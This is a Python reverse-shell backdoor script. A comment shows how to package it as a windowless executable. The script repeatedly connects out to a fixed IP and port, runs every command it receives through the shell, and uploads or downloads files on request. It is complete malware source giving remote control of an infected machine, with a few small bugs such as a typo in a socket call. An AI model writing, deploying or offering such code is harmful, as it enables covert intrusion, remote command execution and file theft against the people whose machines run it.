import socket
import time 
import json
import subprocess
import os

#in cmd type 
#pyinstaller backdoor.py --onefile --noconsole

def reliable_send(data):
    jsondata=json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data=''
    while True:
        try:
            data=data+s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)    
        try:
            s.connect(("192.168.56.1",5555))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    f=open(file_name,'rb')
    s.send(f.read())

def download_file(file_name):
    f=open(file_name,'wb')
    s.settimeout(1)
    block= s.recvv(1024)
    while block:
        f.write(block)
        try:
            block=s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def shell():
    try:
        while True:
            command=reliable_recv()
            if command=='quit':
                break
            elif command=='clear':
                pass
            elif command[:3]=='cd ':
                os.chdir(command[3:])
            elif command[:8]=='download':
                upload_file(command[9:])
            elif command[:6]=='upload':
                download_file(command[7:])
            else:
                execute= subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                result=execute.stdout.read() + execute.stderr.read()
                result=result.decode()
                reliable_send(result)
    except:
        continue


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()